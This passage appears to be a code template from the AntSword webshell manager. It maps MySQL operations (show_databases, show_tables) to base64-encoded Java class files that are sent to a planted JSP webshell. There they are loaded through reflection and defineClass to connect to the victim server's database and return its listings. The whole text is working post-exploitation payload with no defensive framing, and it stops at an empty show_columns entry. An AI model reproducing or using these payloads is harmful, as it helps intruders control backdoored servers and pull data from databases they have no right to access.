//
// 默认代码模板
//
// @params
// :encode  SHELL编码
// :conn    数据库连接字符串
// :sql     执行SQL语句
// :db      数据库名
// :table   表名

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  show_databases: {
    _: 'yv66vgAAADEBNQoASACDCQBlAIQJAGUAhQgAhgkAZQCHCACICQBlAIkIAIoJAGUAiwoAZQCMBwCNCgALAIMIAI4IAI8IAJAIAJEIAJIIAJMLAEMAlAsAQgCVCwBDAJULAEIAlgoAZQCXCQBlAJgKAGUAmQoACwCaBwCbBwCcCgAcAIMIAJ0KABwAngoAGwCfCgAcAJ8LAEMAoAoACwCfCgBlAKEKAKIAowoApAClCgApAKYKACkApwcAqAoAZQCpCgApAKoIAKsKACkArAgArQgArgoAKQCvCgApALAKAEYAsQgAsgoAswC0CwC1ALYLALcAuAsAuQC6CwC7ALwLALsAvQsAuQC+CwC5AL8IAMAIAMEKAGUAwgoASADDCgBGAMQHAMUHAMYHAMcIAMgIAMkHAMoKAEYAywcAzAoAzQDOCADPCABmCgBGANAKANEA0goA0QDTCABoBwDUCADVBwDWCQCkANcKAM0A0goARgDYCgCkANkKAEYA2goA2wDcCgBIAJ8IAN0KAN4A3wgA4AoAKQDhCADiCADjCgBGAOQIAHUIAOUIAOYKAEYA5wcA6AEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEACmV4ZWN1dGVTUUwBAG8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7WilMamF2YS9sYW5nL1N0cmluZzsBAA1zaG93RGF0YWJhc2VzAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABNTaG93X2RhdGFiYXNlcy5qYXZhDABvAHAMAGYAZwwAaABpAQAGYmFzZTY0DABqAGsBAA9hbnRzd29yZENoYXJzZXQMAGwAawEAFGFudHN3b3JkcmFuZG9tUHJlZml4DABtAGsMAHwAfQEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEAEmFudHN3b3JkYXJnZGVjb2RlcgEACXRleHQvaHRtbAwA6QDqDADrAOoMAOwAdgwAdQB2DABuAGsMAHoAewwA7QDuAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDADtAO8MAPAA8QwA8gDzDAB+AHYHAPQMAPUA6gcA9gwA9wD4DAD5APoMAHMAdAEAEGphdmEvbGFuZy9TdHJpbmcMAH8AgAwAbwD7AQAADAD8APEBAAINCgEAAQoMAP0A/gwA/wEADAEBAQIBABMmY2hhcmFjdGVyRW5jb2Rpbmc9BwEDDAEEAQUHAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4HAQ8MARABEQwBEgD6DAETARQMARUA+gEADnNob3cgZGF0YWJhc2VzAQABCQwAeAB5DAEWARcMARgBFAEAE1tMamF2YS9sYW5nL09iamVjdDsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMARkBGgEAEGphdmEvbGFuZy9PYmplY3QHARsMARwBHQEAC2dldFJlc3BvbnNlDAEeAR8HASAMASEBIgwBIwEkAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBJQEmDAEnASgMASkBKgwBKwEsBwEtDAEuAS8BAAxqYXZhLnZlcnNpb24HATAMATEAdgEAAzEuOQwBMgD4AQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIMATMBGgEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAS4BNAEAHWRhdGFiYXNlL215c3FsL1Nob3dfZGF0YWJhc2VzAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEdHJpbQEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABZqYXZhL3NxbC9Ecml2ZXJNYW5hZ2VyAQANZ2V0Q29ubmVjdGlvbgEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL0Nvbm5lY3Rpb247AQATamF2YS9zcWwvQ29ubmVjdGlvbgEAD2NyZWF0ZVN0YXRlbWVudAEAFigpTGphdmEvc3FsL1N0YXRlbWVudDsBABJqYXZhL3NxbC9TdGF0ZW1lbnQBAAxleGVjdXRlUXVlcnkBACgoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9SZXN1bHRTZXQ7AQASamF2YS9zcWwvUmVzdWx0U2V0AQALZ2V0TWV0YURhdGEBAB4oKUxqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YTsBABpqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YQEADmdldENvbHVtbkNvdW50AQADKClJAQANZ2V0Q29sdW1uTmFtZQEABG5leHQBAAMoKVoBAAlnZXRTdHJpbmcBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdpc0FycmF5AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9D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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}'
  },
  show_tables: {
    _: 'yv66vgAAADEBNwoASQCECQBmAIUJAGYAhggAhwkAZgCICACJCQBmAIoIAIsJAGYAjAoAZgCNBwCOCgALAIQIAI8IAJAIAJEIAJIIAJMIAJQIAJULAEQAlgsAQwCXCwBEAJcLAEMAmAoAZgCZCQBmAJoKAGYAmwoACwCcBwCdBwCeCgAdAIQIAJ8KAB0AoAoAHAChCgAdAKELAEQAogoACwChCgBmAKMKAKQApQoApgCnCgAqAKgKACoAqQcAqgoAZgCrCgAqAKwIAK0KACoArggArwgAsAoAKgCxCgAqALIKAEcAswgAtAoAtQC2CwC3ALgLALkAugsAuwC8CwC9AL4LAL0AvwsAuwDACwC7AMEIAMIIAMMKAGYAxAoASQDFCgBHAMYHAMcHAMgHAMkIAMoIAMsHAMwKAEcAzQcAzgoAzwDQCADRCABnCgBHANIKANMA1AoA0wDVCABpBwDWCADXBwDYCQCmANkKAM8A1AoARwDaCgCmANsKAEcA3AoA3QDeCgBJAKEIAN8KAOAA4QgA4goAKgDjCADkCADlCgBHAOYIAHYIAOcIAOgKAEcA6QcA6gEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEACmV4ZWN1dGVTUUwBAG8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7WilMamF2YS9sYW5nL1N0cmluZzsBAApzaG93VGFibGVzAQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABBTaG93X3RhYmxlcy5qYXZhDABwAHEMAGcAaAwAaQBqAQAGYmFzZTY0DABrAGwBAA9hbnRzd29yZENoYXJzZXQMAG0AbAEAFGFudHN3b3JkcmFuZG9tUHJlZml4DABuAGwMAH0AfgEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADWFudHN3b3JkYXJnZGIBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAOsA7AwA7QDsDADuAHcMAHYAdwwAbwBsDAB7AHwMAO8A8AEAE2phdmEvbGFuZy9FeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwA7wDxDADyAPMMAPQA9QwAfwB3BwD2DAD3AOwHAPgMAPkA+gwA+wD8DAB0AHUBABBqYXZhL2xhbmcvU3RyaW5nDACAAIEMAHAA/QEAAAwA/gDzAQACDQoBAAEKDAD/AQAMAQEBAgwBAwEEAQATJmNoYXJhY3RlckVuY29kaW5nPQcBBQwBBgEHBwEIDAEJAQoHAQsMAQwBDQcBDgwBDwEQBwERDAESARMMARQA/AwBFQEWDAEXAPwBABFzaG93IHRhYmxlcyBmcm9tIAEAAQkMAHkAegwBGAEZDAEaARYBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQBAApnZXRSZXF1ZXN0AQAPamF2YS9sYW5nL0NsYXNzDAEbARwBABBqYXZhL2xhbmcvT2JqZWN0BwEdDAEeAR8BAAtnZXRSZXNwb25zZQwBIAEhBwEiDAEjASQMASUBJgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQACW0IMAScBKAwBKQEqDAErASwMAS0BLgcBLwwBMAExAQAMamF2YS52ZXJzaW9uBwEyDAEzAHcBAAMxLjkMATQA+gEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyDAE1ARwBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAEwATYBABpkYXRhYmFzZS9teXNxbC9TaG93X3RhYmxlcwEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABHRyaW0BAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAWamF2YS9zcWwvRHJpdmVyTWFuYWdlcgEADWdldENvbm5lY3Rpb24BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9Db25uZWN0aW9uOwEAE2phdmEvc3FsL0Nvbm5lY3Rpb24BAA9jcmVhdGVTdGF0ZW1lbnQBABYoKUxqYXZhL3NxbC9TdGF0ZW1lbnQ7AQASamF2YS9zcWwvU3RhdGVtZW50AQAMZXhlY3V0ZVF1ZXJ5AQAoKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvUmVzdWx0U2V0OwEAEmphdmEvc3FsL1Jlc3VsdFNldAEAC2dldE1ldGFEYXRhAQAeKClMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7AQAaamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGEBAA5nZXRDb2x1bW5Db3VudAEAAygpSQEADWdldENvbHVtbk5hbWUBAARuZXh0AQADKClaAQAJZ2V0U3RyaW5nAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAHaXNBcnJheQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29u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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::db}'
  },
  show_columns: {
